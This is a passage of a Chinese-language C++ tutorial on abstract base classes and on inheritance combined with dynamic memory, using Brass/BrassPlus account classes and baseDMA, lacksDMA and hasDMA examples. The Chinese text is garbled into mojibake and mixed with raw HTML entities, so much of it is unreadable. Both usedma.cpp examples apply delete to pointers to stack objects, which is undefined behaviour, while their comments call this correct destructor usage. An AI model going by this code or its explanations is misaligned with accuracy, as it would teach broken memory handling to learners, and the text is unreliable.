æˆ–è€…æ˜¾å¼è°ƒç”¨ AcctABC(ba.FullName(), ba.AcctNum(), ba.Balance()) // (éœ€è¦ ba æä¾›è®¿é—®å™¨æˆ– AcctABC æˆå‘˜æ˜¯ protected) maxLoan = ml; owesBank = 0.0; rate = r;&#125;// å®ç°çº¯è™šå‡½æ•° ViewAcctvoid BrassPlus::ViewAcct() const &#123; Formatting f = SetFormat(); cout &lt;&lt; &quot;BrassPlus Client: &quot; &lt;&lt; FullName() &lt;&lt; endl; cout &lt;&lt; &quot;Account Number: &quot; &lt;&lt; AcctNum() &lt;&lt; endl; cout &lt;&lt; &quot;Balance: $&quot; &lt;&lt; Balance() &lt;&lt; endl; cout &lt;&lt; &quot;Maximum loan: $&quot; &lt;&lt; maxLoan &lt;&lt; endl; cout &lt;&lt; &quot;Owed to bank: $&quot; &lt;&lt; owesBank &lt;&lt; endl; cout.precision(3); cout &lt;&lt; &quot;Loan Rate: &quot; &lt;&lt; 100 * rate &lt;&lt; &quot;%\\n&quot;; Restore(f);&#125;// å®ç°çº¯è™šå‡½æ•° Withdrawvoid BrassPlus::Withdraw(double amt) &#123; if (amt &lt; 0) &#123; cout &lt;&lt; &quot;Withdrawal amount must be positive; &quot; &lt;&lt; &quot;withdrawal canceled.\\n&quot;; return; &#125; Formatting f = SetFormat(); double bal = Balance(); // è·å–å½“å‰ä½™é¢ if (amt &lt;= bal) &#123; // å¦‚æœä½™é¢è¶³å¤Ÿ // è°ƒç”¨åŸºç±»çš„ Withdraw (å¦‚æœå®ƒä¿®æ”¹ä½™é¢) æˆ–ç›´æ¥ä¿®æ”¹ // å‡è®¾ balance æ˜¯ protected: balance -= amt; &#125; else if (amt &lt;= bal + maxLoan - owesBank) &#123; // å¦‚æœä½™é¢+å‰©ä½™å¯é€æ”¯é¢åº¦è¶³å¤Ÿ double advance = amt - bal; // éœ€è¦é€æ”¯çš„é‡‘é¢ owesBank += advance * (1.0 + rate); // è®¡ç®—æ¬ æ¬¾ (åŠ ä¸Šåˆ©æ¯) cout &lt;&lt; &quot;Bank advance: $&quot; &lt;&lt; advance &lt;&lt; endl; cout &lt;&lt; &quot;Finance charge: $&quot; &lt;&lt; advance * rate &lt;&lt; endl; Deposit(advance); // å…ˆå­˜å…¥é€æ”¯é¢åº¦ (å¢åŠ ä½™é¢) // å†å–æ¬¾ (ä¿®æ”¹ä½™é¢) // å‡è®¾ balance æ˜¯ protected: balance -= amt; &#125; else &#123; cout &lt;&lt; &quot;Credit limit exceeded. Transaction cancelled.\\n&quot;; &#125; Restore(f);&#125; ä½¿ç”¨ç¤ºä¾‹ (usebrass1.cpp) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;iostream&gt;#include &quot;acctabc.h&quot; // åŒ…å« ABC å’Œæ´¾ç”Ÿç±»const int CLIENTS = 4;int main() &#123; using std::cin; using std::cout; using std::endl; // AcctABC anAccount; // é”™è¯¯ï¼ä¸èƒ½åˆ›å»ºæŠ½è±¡åŸºç±»å¯¹è±¡ AcctABC * p_clients[CLIENTS]; // å¯ä»¥åˆ›å»ºæŒ‡å‘ ABC çš„æŒ‡é’ˆæ•°ç»„ std::string temp; long tempnum; double tempbal; char kind; for (int i = 0; i &lt; CLIENTS; i++) &#123; cout &lt;&lt; &quot;Enter client&#x27;s name: &quot;; getline(cin, temp); cout &lt;&lt; &quot;Enter client&#x27;s account number: &quot;; cin &gt;&gt; tempnum; cout &lt;&lt; &quot;Enter opening balance: $&quot;; cin &gt;&gt; tempbal; cout &lt;&lt; &quot;Enter 1 for Brass Account or &quot; &lt;&lt; &quot;2 for BrassPlus Account: &quot;; while (cin &gt;&gt; kind &amp;&amp; (kind != &#x27;1&#x27; &amp;&amp; kind != &#x27;2&#x27;)) cout &lt;&lt; &quot;Enter either 1 or 2: &quot;; if (kind == &#x27;1&#x27;) p_clients[i] = new Brass(temp, tempnum, tempbal); else &#123; double tmax, trate; cout &lt;&lt; &quot;Enter the overdraft limit: $&quot;; cin &gt;&gt; tmax; cout &lt;&lt; &quot;Enter the interest rate &quot; &lt;&lt; &quot;as a decimal fraction: &quot;; cin &gt;&gt; trate; p_clients[i] = new BrassPlus(temp, tempnum, tempbal, tmax, trate); &#125; while (cin.get() != &#x27;\\n&#x27;) // æ¸…é™¤è¡Œå°¾æ¢è¡Œç¬¦ continue; &#125; cout &lt;&lt; endl; // ä½¿ç”¨å¤šæ€æ€§å¤„ç†ä¸åŒç±»å‹çš„è´¦æˆ· for (int i = 0; i &lt; CLIENTS; i++) &#123; p_clients[i]-&gt;ViewAcct(); // è°ƒç”¨è™šå‡½æ•° ViewAcct() cout &lt;&lt; endl; &#125; // é‡Šæ”¾å†…å­˜ for (int i = 0; i &lt; CLIENTS; i++) &#123; delete p_clients[i]; // è°ƒç”¨è™šææ„å‡½æ•°ï¼Œç¡®ä¿æ­£ç¡®çš„ææ„å‡½æ•°è¢«è°ƒç”¨ &#125; cout &lt;&lt; &quot;Done.\\n&quot;; return 0;&#125; ç¼–è¯‘å’Œè¿è¡Œ: 123## å‡è®¾ acctabc.h ä¸­ balance å·²ç§»è‡³ protectedg++ usebrass1.cpp acctabc.cpp -o usebrass1./usebrass1 ç¨‹åºä¼šæç¤ºè¾“å…¥å®¢æˆ·ä¿¡æ¯ï¼Œåˆ›å»ºä¸åŒç±»å‹çš„è´¦æˆ·å¯¹è±¡ï¼Œç„¶åé€šè¿‡åŸºç±»æŒ‡é’ˆæ•°ç»„ p_clients å¤šæ€åœ°è°ƒç”¨ ViewAcct() æ–¹æ³•ï¼Œæ˜¾ç¤ºæ¯ä¸ªè´¦æˆ·çš„ä¿¡æ¯ã€‚æœ€åï¼Œé€šè¿‡ delete p_clients[i] å®‰å…¨åœ°é”€æ¯å¯¹è±¡ï¼Œå› ä¸º ~AcctABC() æ˜¯è™šææ„å‡½æ•°ã€‚ 13.6.2 ABC ç†å¿µæŠ½è±¡åŸºç±»çš„æ ¸å¿ƒç†å¿µæ˜¯æ¥å£ä¸å®ç°åˆ†ç¦»ã€‚ æ¥å£: ABC å®šä¹‰äº†ä¸€ä¸ªé€šç”¨çš„æ¥å£ï¼ˆé€šè¿‡çº¯è™šå‡½æ•°å’Œå¯èƒ½çš„éè™šå‡½æ•°ï¼‰ï¼Œè§„å®šäº†æ´¾ç”Ÿç±»åº”è¯¥å…·æœ‰å“ªäº›åŠŸèƒ½ã€‚ å®ç°: å…·ä½“çš„æ´¾ç”Ÿç±»è´Ÿè´£æä¾›è¿™äº›åŠŸèƒ½çš„å…·ä½“å®ç°ã€‚ ä½¿ç”¨ ABC çš„å¥½å¤„ï¼š å¼ºåˆ¶æ¥å£ç»Ÿä¸€: ç¡®ä¿æ‰€æœ‰ç›¸å…³çš„æ´¾ç”Ÿç±»éƒ½éµå¾ªä¸€ä¸ªå…±åŒçš„æ¥å£è§„èŒƒã€‚ å®ç°å¤šæ€: å…è®¸é€šè¿‡åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨æ¥ç»Ÿä¸€å¤„ç†ä¸åŒæ´¾ç”Ÿç±»çš„å¯¹è±¡ï¼Œè°ƒç”¨å®ƒä»¬å„è‡ªå®ç°çš„è™šå‡½æ•°ç‰ˆæœ¬ã€‚ ä»£ç å¯æ‰©å±•æ€§: å½“éœ€è¦æ·»åŠ æ–°çš„è´¦æˆ·ç±»å‹ï¼ˆä¾‹å¦‚ SavingsAccountï¼‰æ—¶ï¼Œåªéœ€ä» AcctABC æ´¾ç”Ÿå¹¶å®ç°å…¶çº¯è™šå‡½æ•°å³å¯ï¼Œç°æœ‰ä½¿ç”¨ AcctABC* çš„ä»£ç ï¼ˆå¦‚ main å‡½æ•°ä¸­çš„å¾ªç¯ï¼‰é€šå¸¸æ— éœ€ä¿®æ”¹å°±èƒ½å¤„ç†æ–°çš„è´¦æˆ·ç±»å‹ã€‚ æ¸…æ™°çš„è®¾è®¡: æ›´å¥½åœ°æ¨¡æ‹Ÿç°å®ä¸–ç•Œä¸­çš„æŠ½è±¡æ¦‚å¿µå’Œå±‚æ¬¡å…³ç³»ã€‚ ABC æ˜¯ C++ ä¸­å®ç°æŠ½è±¡å’Œå¤šæ€çš„å…³é”®å·¥å…·ï¼Œå¯¹äºè®¾è®¡çµæ´»ã€å¯ç»´æŠ¤çš„é¢å‘å¯¹è±¡ç³»ç»Ÿéå¸¸é‡è¦ã€‚ 13.7 ç»§æ‰¿å’ŒåŠ¨æ€å†…å­˜åˆ†é…å½“ç»§æ‰¿ä¸åŠ¨æ€å†…å­˜åˆ†é…ï¼ˆä½¿ç”¨ new å’Œ deleteï¼‰ç»“åˆæ—¶ï¼Œæˆ‘ä»¬éœ€è¦ç‰¹åˆ«æ³¨æ„ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦çš„è¡Œä¸ºï¼Œä»¥ç¡®ä¿èµ„æºçš„æ­£ç¡®ç®¡ç†ã€‚ä¸»è¦æœ‰ä¸¤ç§æƒ…å†µï¼š 13.7.1 ç¬¬ä¸€ç§æƒ…å†µï¼šæ´¾ç”Ÿç±»ä¸ä½¿ç”¨ newå¦‚æœåŸºç±»ä½¿ç”¨äº†åŠ¨æ€å†…å­˜åˆ†é…ï¼ˆå› æ­¤éœ€è¦è‡ªå®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°ã€èµ‹å€¼è¿ç®—ç¬¦ï¼‰ï¼Œè€Œæ´¾ç”Ÿç±»æ²¡æœ‰ä½¿ç”¨ new æ¥åˆ†é…è‡ªå·±çš„åŠ¨æ€å†…å­˜ï¼Œæƒ…å†µç›¸å¯¹ç®€å•ã€‚ ææ„å‡½æ•°: æ´¾ç”Ÿç±»ä¸éœ€è¦æ˜¾å¼å®šä¹‰ææ„å‡½æ•°æ¥é‡Šæ”¾å†…å­˜ï¼ˆå› ä¸ºå®ƒæ²¡æœ‰åˆ†é…ï¼‰ã€‚ å½“æ´¾ç”Ÿç±»å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œä¼šå…ˆæ‰§è¡Œæ´¾ç”Ÿç±»çš„ææ„å‡½æ•°ï¼ˆå³ä½¿æ˜¯ç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤ç‰ˆæœ¬ï¼‰ï¼Œç„¶åè‡ªåŠ¨è°ƒç”¨åŸºç±»çš„ææ„å‡½æ•°ã€‚ å…³é”®: ä¸ºäº†èƒ½é€šè¿‡åŸºç±»æŒ‡é’ˆ delete æ´¾ç”Ÿç±»å¯¹è±¡ï¼ŒåŸºç±»çš„ææ„å‡½æ•°å¿…é¡»å£°æ˜ä¸º virtualã€‚å¦‚æœåŸºç±»ææ„å‡½æ•°æ˜¯è™šå‡½æ•°ï¼Œé‚£ä¹ˆ delete basePtr; (å…¶ä¸­ basePtr æŒ‡å‘æ´¾ç”Ÿç±»å¯¹è±¡) ä¼šå…ˆè°ƒç”¨æ´¾ç”Ÿç±»çš„ææ„å‡½æ•°ï¼Œå†è°ƒç”¨åŸºç±»çš„ææ„å‡½æ•°ï¼Œç¡®ä¿æ‰€æœ‰èµ„æºè¢«æ­£ç¡®é‡Šæ”¾ã€‚ å¤åˆ¶æ„é€ å‡½æ•°: æ´¾ç”Ÿç±»çš„é»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°ä¼šæ‰§è¡Œæˆå‘˜é€ä¸€å¤åˆ¶ã€‚å¯¹äºç»§æ‰¿è‡ªåŸºç±»çš„éƒ¨åˆ†ï¼Œå®ƒä¼šè‡ªåŠ¨è°ƒç”¨åŸºç±»çš„å¤åˆ¶æ„é€ å‡½æ•°ã€‚ å› æ­¤ï¼Œå¦‚æœåŸºç±»çš„å¤åˆ¶æ„é€ å‡½æ•°æ­£ç¡®å®ç°äº†æ·±å¤åˆ¶ï¼Œé‚£ä¹ˆæ´¾ç”Ÿç±»å¯¹è±¡çš„åŸºç±»éƒ¨åˆ†ä¹Ÿä¼šè¢«æ­£ç¡®åœ°æ·±å¤åˆ¶ã€‚æ´¾ç”Ÿç±»è‡ªèº«çš„æˆå‘˜ï¼ˆéåŠ¨æ€åˆ†é…ï¼‰ä¼šè¢«æ­£å¸¸å¤åˆ¶ã€‚ èµ‹å€¼è¿ç®—ç¬¦: æ´¾ç”Ÿç±»çš„é»˜è®¤èµ‹å€¼è¿ç®—ç¬¦ä¼šæ‰§è¡Œæˆå‘˜é€ä¸€èµ‹å€¼ã€‚å¯¹äºç»§æ‰¿è‡ªåŸºç±»çš„éƒ¨åˆ†ï¼Œå®ƒä¼šè‡ªåŠ¨è°ƒç”¨åŸºç±»çš„èµ‹å€¼è¿ç®—ç¬¦ã€‚ å› æ­¤ï¼Œå¦‚æœåŸºç±»çš„èµ‹å€¼è¿ç®—ç¬¦æ­£ç¡®å®ç°äº†æ·±å¤åˆ¶ï¼ˆåŒ…æ‹¬å¤„ç†è‡ªæˆ‘èµ‹å€¼å’Œé‡Šæ”¾æ—§å†…å­˜ï¼‰ï¼Œé‚£ä¹ˆæ´¾ç”Ÿç±»å¯¹è±¡çš„åŸºç±»éƒ¨åˆ†ä¹Ÿä¼šè¢«æ­£ç¡®åœ°èµ‹å€¼ã€‚ ç»“è®º: å¦‚æœåŸºç±»æ­£ç¡®åœ°ç®¡ç†äº†å®ƒçš„åŠ¨æ€å†…å­˜ï¼ˆéµå¾ªä¸‰/äº”æ³•åˆ™ï¼Œç‰¹åˆ«æ˜¯ä½¿ç”¨è™šææ„å‡½æ•°ï¼‰ï¼Œå¹¶ä¸”æ´¾ç”Ÿç±»æ²¡æœ‰å¼•å…¥æ–°çš„åŠ¨æ€å†…å­˜ç®¡ç†éœ€æ±‚ï¼Œé‚£ä¹ˆæ´¾ç”Ÿç±»é€šå¸¸ä¸éœ€è¦æ˜¾å¼å®šä¹‰è¿™äº›ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°ã€‚ ç¤ºä¾‹ (baseDMA å’Œ lacksDMA): 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111// dma.h -- ç»§æ‰¿å’ŒåŠ¨æ€å†…å­˜åˆ†é…#ifndef DMA_H_#define DMA_H_#include &lt;iostream&gt;// ä½¿ç”¨åŠ¨æ€å†…å­˜åˆ†é…çš„åŸºç±»class baseDMA &#123;private: char * label; int rating;public: baseDMA(const char * l = &quot;null&quot;, int r = 0); baseDMA(const baseDMA &amp; rs); // å¤åˆ¶æ„é€ å‡½æ•° virtual ~baseDMA(); // è™šææ„å‡½æ•° baseDMA &amp; operator=(const baseDMA &amp; rs); // èµ‹å€¼è¿ç®—ç¬¦ friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const baseDMA &amp; rs);&#125;;// æ´¾ç”Ÿç±» - ä¸ä½¿ç”¨ newclass lacksDMA : public baseDMA &#123;private: enum &#123; COL_LEN = 40 &#125;; char color[COL_LEN];public: lacksDMA(const char * c = &quot;blank&quot;, const char * l = &quot;null&quot;, int r = 0); lacksDMA(const char * c, const baseDMA &amp; rs); // ä¸éœ€è¦è‡ªå®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°ã€èµ‹å€¼è¿ç®—ç¬¦ friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const lacksDMA &amp; ls);&#125;;#endif // DMA_H_// dma.cpp -- å®ç°#include &quot;dma.h&quot;#include &lt;cstring&gt;// --- baseDMA å®ç° ---baseDMA::baseDMA(const char * l, int r) &#123; label = new char[std::strlen(l) + 1]; std::strcpy(label, l); rating = r;&#125;baseDMA::baseDMA(const baseDMA &amp; rs) &#123; // æ·±å¤åˆ¶ label = new char[std::strlen(rs.label) + 1]; std::strcpy(label, rs.label); rating = rs.rating;&#125;baseDMA::~baseDMA() &#123; delete [] label;&#125;baseDMA &amp; baseDMA::operator=(const baseDMA &amp; rs) &#123; // æ·±å¤åˆ¶èµ‹å€¼ if (this == &amp;rs) return *this; delete [] label; // é‡Šæ”¾æ—§å†…å­˜ label = new char[std::strlen(rs.label) + 1]; std::strcpy(label, rs.label); rating = rs.rating; return *this;&#125;std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const baseDMA &amp; rs) &#123; os &lt;&lt; &quot;Label: &quot; &lt;&lt; rs.label &lt;&lt; std::endl; os &lt;&lt; &quot;Rating: &quot; &lt;&lt; rs.rating &lt;&lt; std::endl; return os;&#125;// --- lacksDMA å®ç° ---lacksDMA::lacksDMA(const char * c, const char * l, int r) : baseDMA(l, r) &#123; // è°ƒç”¨åŸºç±»æ„é€ å‡½æ•° std::strncpy(color, c, COL_LEN - 1); color[COL_LEN - 1] = &#x27;\\0&#x27;;&#125;lacksDMA::lacksDMA(const char * c, const baseDMA &amp; rs) : baseDMA(rs) &#123; // è°ƒç”¨åŸºç±»å¤åˆ¶æ„é€ å‡½æ•° std::strncpy(color, c, COL_LEN - 1); color[COL_LEN - 1] = &#x27;\\0&#x27;;&#125;std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const lacksDMA &amp; ls) &#123; // è°ƒç”¨åŸºç±»çš„ operator&lt;&lt; (éœ€è¦å‹å…ƒæˆ–ç±»å‹è½¬æ¢ï¼Œæˆ–è€…ç›´æ¥è®¿é—®) // è¿™é‡Œå‡è®¾é€šè¿‡ç±»å‹è½¬æ¢æˆ–ç›´æ¥è°ƒç”¨åŸºç±»æ–¹æ³• os &lt;&lt; (const baseDMA &amp;) ls; // å°†æ´¾ç”Ÿç±»å¼•ç”¨è½¬æ¢ä¸ºåŸºç±»å¼•ç”¨æ¥è°ƒç”¨åŸºç±» operator&lt;&lt; os &lt;&lt; &quot;Color: &quot; &lt;&lt; ls.color &lt;&lt; std::endl; return os;&#125;// usedma.cpp -- ä½¿ç”¨ç¤ºä¾‹#include &lt;iostream&gt;#include &quot;dma.h&quot;int main() &#123; using std::cout; using std::endl; baseDMA shirt(&quot;Portabelly&quot;, 8); lacksDMA balloon(&quot;red&quot;, &quot;Blimpo&quot;, 4); // æ´¾ç”Ÿç±»å¯¹è±¡ lacksDMA balloon2(balloon); // ä½¿ç”¨é»˜è®¤å¤åˆ¶æ„é€ å‡½æ•° cout &lt;&lt; &quot;Displaying baseDMA object:\\n&quot;; cout &lt;&lt; shirt; cout &lt;&lt; &quot;Displaying lacksDMA object:\\n&quot;; cout &lt;&lt; balloon; cout &lt;&lt; &quot;Result of lacksDMA copy:\\n&quot;; cout &lt;&lt; balloon2; baseDMA * p_dma = &amp;balloon; // åŸºç±»æŒ‡é’ˆæŒ‡å‘æ´¾ç”Ÿç±» cout &lt;&lt; &quot;Deleting derived object via base pointer:\\n&quot;; delete p_dma; // æ­£ç¡®è°ƒç”¨ ~lacksDMA() (é»˜è®¤) ç„¶å ~baseDMA() (è™šå‡½æ•°) return 0;&#125; 13.7.2 ç¬¬äºŒç§æƒ…å†µï¼šæ´¾ç”Ÿç±»ä½¿ç”¨ newå¦‚æœæ´¾ç”Ÿç±»ä¹Ÿä½¿ç”¨äº† new æ¥åˆ†é…è‡ªå·±çš„åŠ¨æ€å†…å­˜ï¼Œé‚£ä¹ˆæ´¾ç”Ÿç±»å¿…é¡»æä¾›è‡ªå·±çš„ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ã€‚ ææ„å‡½æ•° (~Derived()): å¿…é¡»æ˜¾å¼å®šä¹‰ã€‚ è´Ÿè´£ delete æˆ– delete[] æ´¾ç”Ÿç±»è‡ªå·±åˆ†é…çš„å†…å­˜ã€‚ ä¸éœ€è¦ï¼ˆä¹Ÿä¸èƒ½ï¼‰æ˜¾å¼è°ƒç”¨åŸºç±»çš„ææ„å‡½æ•°ï¼›åŸºç±»ææ„å‡½æ•°ä¼šåœ¨æ´¾ç”Ÿç±»ææ„å‡½æ•°æ‰§è¡Œå®Œæ¯•åè‡ªåŠ¨è¢«è°ƒç”¨ã€‚ åŸºç±»ææ„å‡½æ•°ä»åº”æ˜¯ virtualã€‚ å¤åˆ¶æ„é€ å‡½æ•° (Derived(const Derived &amp;)): å¿…é¡»æ˜¾å¼å®šä¹‰ã€‚ åœ¨æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨ä¸­ï¼Œå¿…é¡»æ˜¾å¼è°ƒç”¨åŸºç±»çš„å¤åˆ¶æ„é€ å‡½æ•° Base(other) æ¥å®ŒæˆåŸºç±»éƒ¨åˆ†çš„æ·±å¤åˆ¶ã€‚ ç„¶åï¼Œåœ¨æ„é€ å‡½æ•°ä½“ä¸­ï¼Œä¸ºæ´¾ç”Ÿç±»è‡ªå·±ç®¡ç†çš„åŠ¨æ€å†…å­˜æ‰§è¡Œæ·±å¤åˆ¶ï¼ˆåˆ†é…æ–°å†…å­˜ï¼Œå¤åˆ¶æ•°æ®ï¼‰ã€‚ èµ‹å€¼è¿ç®—ç¬¦ (Derived &amp; operator=(const Derived &amp;)): å¿…é¡»æ˜¾å¼å®šä¹‰ã€‚ æ£€æŸ¥è‡ªæˆ‘èµ‹å€¼ã€‚ æ˜¾å¼è°ƒç”¨åŸºç±»çš„èµ‹å€¼è¿ç®—ç¬¦ Base::operator=(other) æ¥å®ŒæˆåŸºç±»éƒ¨åˆ†çš„æ·±å¤åˆ¶èµ‹å€¼ã€‚ é‡Šæ”¾æ´¾ç”Ÿç±»å½“å‰å¯¹è±¡çš„æ—§åŠ¨æ€å†…å­˜ã€‚ ä¸ºæ´¾ç”Ÿç±»å½“å‰å¯¹è±¡çš„åŠ¨æ€æˆå‘˜åˆ†é…æ–°å†…å­˜ï¼Œå¹¶ä»æºå¯¹è±¡å¤åˆ¶æ•°æ®ã€‚ è¿”å› *thisã€‚ ç¤ºä¾‹ (æ·»åŠ  hasDMA ç±»): 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677// dma.h (ç»­)// æ´¾ç”Ÿç±» - ä½¿ç”¨ newclass hasDMA : public baseDMA &#123;private: char * style; // æ´¾ç”Ÿç±»ç®¡ç†çš„åŠ¨æ€å†…å­˜public: hasDMA(const char * s = &quot;none&quot;, const char * l = &quot;null&quot;, int r = 0); hasDMA(const char * s, const baseDMA &amp; rs); hasDMA(const hasDMA &amp; hs); // å¤åˆ¶æ„é€ å‡½æ•° ~hasDMA(); // ææ„å‡½æ•° hasDMA &amp; operator=(const hasDMA &amp; hs); // èµ‹å€¼è¿ç®—ç¬¦ friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const hasDMA &amp; hs);&#125;;// dma.cpp (ç»­)// --- hasDMA å®ç° ---hasDMA::hasDMA(const char * s, const char * l, int r) : baseDMA(l, r) &#123; // è°ƒç”¨åŸºç±»æ„é€ å‡½æ•° style = new char[std::strlen(s) + 1]; std::strcpy(style, s);&#125;hasDMA::hasDMA(const char * s, const baseDMA &amp; rs) : baseDMA(rs) &#123; // è°ƒç”¨åŸºç±»å¤åˆ¶æ„é€ å‡½æ•° style = new char[std::strlen(s) + 1]; std::strcpy(style, s);&#125;hasDMA::hasDMA(const hasDMA &amp; hs) : baseDMA(hs) &#123; // *** è°ƒç”¨åŸºç±»å¤åˆ¶æ„é€ å‡½æ•° *** style = new char[std::strlen(hs.style) + 1]; // æ·±å¤åˆ¶æ´¾ç”Ÿç±»æˆå‘˜ std::strcpy(style, hs.style);&#125;hasDMA::~hasDMA() &#123; delete [] style; // é‡Šæ”¾æ´¾ç”Ÿç±»åˆ†é…çš„å†…å­˜ (åŸºç±»ææ„å‡½æ•°ä¼šè‡ªåŠ¨è°ƒç”¨)&#125;hasDMA &amp; hasDMA::operator=(const hasDMA &amp; hs) &#123; if (this == &amp;hs) return *this; baseDMA::operator=(hs); // *** è°ƒç”¨åŸºç±»èµ‹å€¼è¿ç®—ç¬¦ *** delete [] style; // é‡Šæ”¾æ´¾ç”Ÿç±»æ—§å†…å­˜ style = new char[std::strlen(hs.style) + 1]; // æ·±å¤åˆ¶æ´¾ç”Ÿç±»æˆå‘˜ std::strcpy(style, hs.style); return *this;&#125;std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const hasDMA &amp; hs) &#123; os &lt;&lt; (const baseDMA &amp;) hs; // æ˜¾ç¤ºåŸºç±»éƒ¨åˆ† os &lt;&lt; &quot;Style: &quot; &lt;&lt; hs.style &lt;&lt; std::endl; // æ˜¾ç¤ºæ´¾ç”Ÿç±»éƒ¨åˆ† return os;&#125;// usedma.cpp (ç»­)int main() &#123; // ... (ä¹‹å‰çš„ä»£ç ) ... cout &lt;&lt; &quot;\\nTesting hasDMA:\\n&quot;; hasDMA map(&quot;Mercator&quot;, &quot;Buffalo Keys&quot;, 5); hasDMA map2 = map; // è°ƒç”¨ hasDMA å¤åˆ¶æ„é€ å‡½æ•° hasDMA map3; map3 = map; // è°ƒç”¨ hasDMA èµ‹å€¼è¿ç®—ç¬¦ cout &lt;&lt; &quot;Displaying hasDMA object:\\n&quot;; cout &lt;&lt; map; cout &lt;&lt; &quot;Result of hasDMA copy:\\n&quot;; cout &lt;&lt; map2; cout &lt;&lt; &quot;Result of hasDMA assignment:\\n&quot;; cout &lt;&lt; map3; baseDMA * p_dma2 = &amp;map; // åŸºç±»æŒ‡é’ˆæŒ‡å‘æ´¾ç”Ÿç±» cout &lt;&lt; &quot;Deleting derived object via base pointer:\\n&quot;; delete p_dma2; // æ­£ç¡®è°ƒç”¨ ~hasDMA() ç„¶å ~baseDMA() return 0;&#125; 13.7.3 ä½¿ç”¨åŠ¨æ€å†…å­˜åˆ†é…å’Œå‹å…ƒçš„ç»§æ‰¿ç¤ºä¾‹åœ¨ä¸Šé¢çš„ lacksDMA å’Œ hasDMA ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬é‡è½½äº† operator&lt;&lt; ä½œä¸ºå‹å…ƒå‡½æ•°ã€‚å½“åœ¨æ´¾ç”Ÿç±»çš„å‹å…ƒå‡½æ•°ä¸­éœ€è¦æ˜¾ç¤ºåŸºç±»ä¿¡æ¯æ—¶ï¼Œæœ‰å‡ ç§æ–¹æ³•ï¼š ä½¿ç”¨åŸºç±»çš„å…¬æœ‰/ä¿æŠ¤æ¥å£: å¦‚æœåŸºç±»æä¾›äº†è®¿é—®æ‰€éœ€ä¿¡æ¯çš„ public æˆ– protected æ–¹æ³•ï¼Œå‹å…ƒå‡½æ•°å¯ä»¥é€šè¿‡æ´¾ç”Ÿç±»å¯¹è±¡è°ƒç”¨è¿™äº›æ–¹æ³•ã€‚ ä½¿ç”¨ç±»å‹è½¬æ¢: å°†æ´¾ç”Ÿç±»å¯¹è±¡çš„å¼•ç”¨å¼ºåˆ¶è½¬æ¢ä¸ºåŸºç±»å¯¹è±¡çš„å¼•ç”¨ (const baseDMA &amp;) hsï¼Œç„¶åè°ƒç”¨åŸºç±»ç‰ˆæœ¬çš„ operator&lt;&lt;ã€‚è¿™è¦æ±‚åŸºç±» operator&lt;&lt; ä¹Ÿæ˜¯å‹å…ƒæˆ–èƒ½å¤Ÿé€šè¿‡å…¬æœ‰æ¥å£è®¿é—®æ‰€éœ€ä¿¡æ¯ã€‚ è®©æ´¾ç”Ÿç±»çš„å‹å…ƒä¹Ÿæ˜¯åŸºç±»çš„å‹å…ƒ: è¿™ç§æ–¹å¼æ¯”è¾ƒå°‘è§ï¼Œä¸”å¢åŠ äº†è€¦åˆåº¦ã€‚ åœ¨ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ç±»å‹è½¬æ¢ (const baseDMA &amp;) hs æ¥è°ƒç”¨åŸºç±»çš„ operator&lt;&lt;ï¼Œè¿™æ˜¯ä¸€ç§å¸¸è§çš„åšæ³•ã€‚ æ€»ç»“: å½“æ´¾ç”Ÿç±»ä¸ä½¿ç”¨ new æ—¶ï¼Œé€šå¸¸ä¾èµ–åŸºç±»æ­£ç¡®å®ç°çš„è™šææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦å³å¯ã€‚ å½“æ´¾ç”Ÿç±»ä¹Ÿä½¿ç”¨ new æ—¶ï¼Œæ´¾ç”Ÿç±»å¿…é¡»æä¾›è‡ªå·±çš„ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ã€‚ æ´¾ç”Ÿç±»çš„ææ„å‡½æ•°è´Ÿè´£æ¸…ç†æ´¾ç”Ÿç±»èµ„æºï¼ŒåŸºç±»ææ„å‡½æ•°è‡ªåŠ¨è°ƒç”¨ã€‚ æ´¾ç”Ÿç±»çš„å¤åˆ¶æ„é€ å‡½æ•°å¿…é¡»åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­è°ƒç”¨åŸºç±»å¤åˆ¶æ„é€ å‡½æ•°ã€‚ æ´¾ç”Ÿç±»çš„èµ‹å€¼è¿ç®—ç¬¦å¿…é¡»æ˜¾å¼è°ƒç”¨åŸºç±»èµ‹å€¼è¿ç®—ç¬¦ã€‚ åŸºç±»ææ„å‡½æ•°åº”å§‹ç»ˆä¸ºè™šå‡½æ•°ï¼Œä»¥ç¡®ä¿é€šè¿‡åŸºç±»æŒ‡é’ˆ delete æ´¾ç”Ÿç±»å¯¹è±¡æ—¶è¡Œä¸ºæ­£ç¡®ã€‚ 13.8 ç±»è®¾è®¡å›é¡¾ç»è¿‡å‰é¢å‡ ç« çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å·²ç»æ¥è§¦äº† C++ 